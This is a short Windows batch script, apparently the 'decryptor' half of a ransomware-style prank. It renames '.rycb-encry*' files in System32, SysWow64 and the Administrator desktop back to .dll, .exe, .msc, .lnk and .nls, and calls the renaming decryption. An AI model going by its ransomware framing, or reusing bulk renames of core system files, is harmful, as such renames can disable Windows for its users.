@echo off
title Decrypt your files
echo We will decrypt your files.
cd /d C:/WINDOWS/System32
ren *.rycb-encryd *.dll
ren *.rycb-encrye *.exe
ren *.rycb-encrym *.msc
cd /d C:/WINDOWS/SysWow64
ren *.rycb-encryd *.dll
ren *.rycb-encrye *.exe
ren *.rycb-encrym *.msc
cd /d C:\Users\Administrator/Desktop
ren *.rycb-encryl *.lnk
cd /d C:/Windows/System32
ren *.rycb-encryn *.nls
cd /d C:/Windows
echo Decryption operation completed successfully.
pause>nul
